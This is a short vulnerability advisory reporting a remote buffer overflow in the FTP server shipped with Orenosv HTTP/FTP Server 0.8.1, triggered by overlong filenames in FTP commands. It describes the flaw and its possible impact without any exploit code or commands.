The FTP server shipped with Orenosv HTTP/FTP is prone to a remote buffer-overflow vulnerability.

This issue presents itself when the application handles excessive values supplied as filenames through various FTP commands.

A successful attack may corrupt memory, cause a denial of service, or execute arbitrary code.

Orenosv HTTP/FTP Server 0.8.1 is reportedly vulnerable; other versions may be affected as well.
